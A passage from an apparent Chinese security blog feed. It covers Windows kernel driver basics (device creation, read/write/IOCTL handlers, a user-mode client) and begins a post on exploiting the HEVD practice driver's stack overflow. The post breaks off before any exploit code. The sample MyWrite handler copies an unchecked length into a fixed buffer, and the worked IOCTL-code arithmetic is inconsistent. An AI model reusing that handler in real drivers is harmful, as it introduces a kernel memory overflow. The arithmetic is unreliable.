class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/1d37d1b44725a3e158122215fe25ae4b.png" alt="image-20240116161601128" /></p><h1 id="c-二阶段"><a class="markdownIt-Anchor" href="#c-二阶段"></a> C. 二阶段</h1><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice</a></p><p>关于创建设备的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in] DeviceExtensionSize</span><br></pre></td></tr></table></figure><p>指定要为 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/device-extensions">设备对象的设备扩展</a> 分配的驱动程序确定的字节数。 设备扩展的内部结构是驱动程序定义的。</p></blockquote><ul><li>维护设备状态信息。</li><li>为驱动程序使用的任何内核定义对象或其他系统资源（如旋转锁）提供存储。</li><li>保存驱动程序必须在系统空间中驻留的任何数据，以执行其 I/O 操作。</li></ul><p>那么这就是一段描述要传输的数据的空间的大小的值。</p><h3 id="从驱动中读取"><a class="markdownIt-Anchor" href="#从驱动中读取"></a> 从驱动中读取</h3><p>驱动<code>MyRead</code>函数和<code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyRead</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Want Read %x\n&quot;</span>, ReadSize);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Buffer, <span class="string">&quot;Message From Driver&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR Test[<span class="number">0x40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD lpRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hDevice, Test, <span class="number">30</span>, &amp;lpRead, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p -%s--%d\n&quot;</span>, Test, Test,lpRead);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>30</code>是要读取的字节</li><li><code>lpRead</code>是真实读取的字节</li></ul><p><img src="https://img.joe1sn.top/uploads/big/3d59cd4377a3136afc0e76d05ef229d5.png" alt="image-20240116163249545" /></p><p>每向下传递一层需要一个设备栈（可以试着从自己设计这样一个模式的角度想想）</p><p><code>SystemBuffer</code>和<code>pIrp-&gt;MdlAddress</code>是同一块物理地址的两个不同虚拟地址（不同的映射）。</p><p><img src="https://img.joe1sn.top/uploads/big/c97a37804385b4dfaec106605e5f35d4.png" alt="image-20240116165239380" /></p><p>需要设置读写方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"><span class="comment">//设备创建成功，绑定符号链接</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/89ee511b22780e94cccf65aab59b4943.png" alt="image-20240116171657645" /></p><h3 id="向驱动中写入"><a class="markdownIt-Anchor" href="#向驱动中写入"></a> 向驱动中写入</h3><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(hDevice, <span class="string">&quot;This is From Ring3.&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;This is From Ring3.&quot;</span>), &amp;lpRead, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyWrite</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Wrtitten\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Write.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Write Read %x\n&quot;</span>, ReadSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(pdevice-&gt;DeviceExtension, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(pdevice-&gt;DeviceExtension, Buffer, ReadSize);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;--%p-%s\n&quot;</span>, Buffer, (PCHAR)pdevice-&gt;DeviceExtension);</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/13f59b1ae2e3d665dcc0de8b593d6297.png" alt="image-20240116173208413" /></p><h3 id="ioctl自定义控制io"><a class="markdownIt-Anchor" href="#ioctl自定义控制io"></a> [IOCTL]自定义控制IO</h3><p><code>IRP_MJ_DEVICE_CONTROL</code>，定义IOCTL操作，<strong>很多内核的交互大多都是依靠此方式</strong></p><p>这里程序接收一个数字返回值x2</p><p>驱动</p><p>定义操作标识</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>0x9888：标识符号</li></ul><p>编写函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">MyControl</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    DbgPrint(<span class="string">&quot;My Device Has IOCTL\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">    ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;   <span class="comment">//功能码</span></span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;     <span class="comment">//出入长度</span></span><br><span class="line">    <span class="comment">//ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;   //输出长度</span></span><br><span class="line">    ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ioCode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">    &#123;</span><br><span class="line">        DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;   <span class="comment">//取出传输的数据</span></span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">        inData *= <span class="number">2</span>;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">        *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;             <span class="comment">//写回操作</span></span><br><span class="line">        ioInfo = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">        ioInfo = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = ioInfo;</span><br><span class="line">    IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbf7757867f48efe014c738e8fb56bc.png" alt="image-20240116185236732" /></p><h3 id="一些关键函数"><a class="markdownIt-Anchor" href="#一些关键函数"></a> 一些关键函数</h3><p><code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建设备</span></span><br><span class="line">    UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">    PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x200</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">    <span class="comment">//设备创建成功，绑定符号链接</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device &amp; Symbolic Link Created\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Function Settal Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DriverUnload</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于在Ring3交互的项目的主函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// R3Control.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;now IOCTL\n&quot;</span>;</span><br><span class="line">    DWORDLONG a = <span class="number">64</span>;</span><br><span class="line">    DWORDLONG b = <span class="number">0</span>;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_MUL, &amp;a, <span class="built_in">sizeof</span>(DWORDLONG), &amp;b, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value a: %lld, b: %lld\nreal info %d\n&quot;</span>, a, b, info);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p><p><a href="https://space.bilibili.com/1992190180/">https://space.bilibili.com/1992190180/</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13363&quot;&gt;https://xz.aliyun.com/t/13363&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从零探索现代windows内核栈溢出-以HEVD练习为例（中）</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-01-25T07:30:31.531Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="">上一篇</a>中了解了与内核的交互模式，这里就可以开始做HEVD了</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13364">https://xz.aliyun.com/t/13364</a></p><span id="more"></span><h1 id="编写交互模块"><a class="markdownIt-Anchor" href="#编写交互模块"></a> 编写交互模块</h1><h2 id="a-计算io_ctl值"><a class="markdownIt-Anchor" href="#a-计算io_ctl值"></a> A. 计算IO_CTL值</h2><p><strong>其实不用这步，但是可以当作更多的了解</strong></p><p>在之前的交互中有这么一条定义功能号</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure><p>但是…HEVD逆向会发现是这样的</p><p><img src="https://img.joe1sn.top/uploads/big/b5952825f83268246d9e59addb480507.png" alt="image-20240117184722533" /></p><p>发现<code>CTL_CODE</code>也是个宏定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>其中，这里</p><ul><li>DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22</li><li>Function -&gt; = 0x9888</li><li>Method -&gt; METHOD_BUFFERED=0</li><li>Access -&gt; FILE_ANY_ACCESS=0</li></ul><p>表达式就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0</span><br><span class="line">= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0</span><br><span class="line">= 0x220000 | 0x9888 &lt;&lt; 2</span><br><span class="line">= 0x226220</span><br></pre></td></tr></table></figure><p>很容易得到逆向，这里以<code>0x226220</code>为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x205B = 0x22205B ^ 0x220000</span><br><span class="line">0x816 = 0x205B&gt;&gt;2</span><br></pre></td></tr></table></figure><p>那么对应的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">io2num</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> ioctl_num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((ioctl_num ^ <span class="number">0x220000</span>) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xfff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面之所以要&amp;一下是因为数据的大小就只有那么大，所以<strong>II文章</strong>的描述符<code>0x9888</code>实际有效的只有<code>0x888</code></p><h2 id="b-功能选择"><a class="markdownIt-Anchor" href="#b-功能选择"></a> B. 功能选择</h2><p>这里就以最简单的内核栈溢出举例子</p><p>每开始一个漏洞利用就编写一个菜单，然后选择解析逆向出来的功能描述符，运行对应函数，没啥好讲的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;============HEVD Hack EXP============\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 1. 